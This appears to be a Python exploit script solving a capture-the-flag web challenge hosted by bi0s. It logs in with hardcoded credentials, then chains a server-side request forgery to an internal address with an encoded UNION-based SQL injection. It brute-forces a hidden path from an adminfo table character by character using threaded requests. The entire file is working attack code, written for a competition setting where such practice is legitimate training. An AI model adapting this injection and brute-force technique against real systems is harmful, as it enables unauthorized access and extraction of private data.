import requests
import string
from multiprocessing import Pool
from threading import Thread
url="http://web.challenge.bi0s.in:6007/login"
url2="http://web.challenge.bi0s.in:6007/return-files?f="
url1="http://web.challenge.bi0s.in:6007/dev_test"
def login():
  r = requests.post(url,data={'username':'admin','password':'1337'}, allow_redirects = False)
  newcookie= r.cookies['session']
  return newcookie

payload = ""
newcookie = login()

a = ["_" for _ in range(15,40)]
def brute(payload):
  global a,newcookie
  for i in '/-'+string.ascii_letters + string.digits+"._":
    data1 = {"url":"http://192.168.112.2?part1=%252527&part2=path,name from adminfo where path like 0x25{}25 and name=0x61646d696e Union select password".format((payload+i).encode('utf-8').hex())}
    r =requests.post(url1,data=data1,cookies={"session":""+newcookie})
    if "Not" in r.text:
      a[len(payload)] = i
      break

for i in range(len(a)):
  payload=i*"_"
  thread = Thread(target = brute, args = (payload, ))
  thread.start()
  thread.join()
  print("".join(a))